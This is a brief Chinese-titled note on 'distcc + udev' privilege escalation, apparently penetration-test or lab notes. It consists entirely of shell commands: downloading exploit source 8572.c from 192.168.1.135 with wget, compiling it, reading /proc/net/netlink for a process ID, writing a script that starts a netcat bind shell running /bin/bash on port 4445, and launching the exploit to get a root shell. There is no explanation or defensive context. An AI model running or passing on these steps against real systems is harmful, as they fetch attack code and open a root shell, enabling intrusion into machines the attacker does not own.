distcc + udev提权

​ cd /tmp

​ wget http://192.168.1.135/8572.c -O udev.c

​ gcc udev.c -o udev

​ cat /proc/net/netlink

​ echo ‘#!/bin/bash’ > run

​ echo ‘/bin/netcat -lvvp 4445 -e /bin/bash’ >> run

​ ./udev 2792
